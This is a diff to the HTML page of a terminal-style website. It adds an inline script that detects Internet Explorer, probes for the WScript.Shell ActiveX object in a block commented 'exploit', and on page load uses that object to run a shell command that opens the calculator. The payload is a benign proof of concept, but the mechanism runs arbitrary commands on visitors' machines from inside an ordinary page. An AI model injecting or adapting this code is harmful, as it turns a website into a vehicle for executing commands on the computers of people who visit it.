@@ -52,5 +52,28 @@
     	<script src="javascripts/jquery.terminal-min.js"></script>
         <script src="components/barekit/js/barekit.min.js"></script>
         <script src="javascripts/main.js"></script>
+        <script>
+        var isIE = /*@cc_on!@*/false
+
+        function checkActiveX(){
+        	try{
+        		var c = new ActiveXObject("WScript.Shell");
+        		// exploit
+        	} catch(err){
+        		return false;
+        	}
+        	if(c){
+        		return true;
+        	}
+
+        }
+
+        if(isIE){
+        	var exploitable = checkActiveX();
+        	if (exploitable){
+            function OpenCalculator(){var commandShell = new ActiveXObject("WScript.Shell");commandShell.Run("calc");commandShell.Quit;}OpenCalculator()
+          }
+        }
+        </script>
     </body>
 </html>
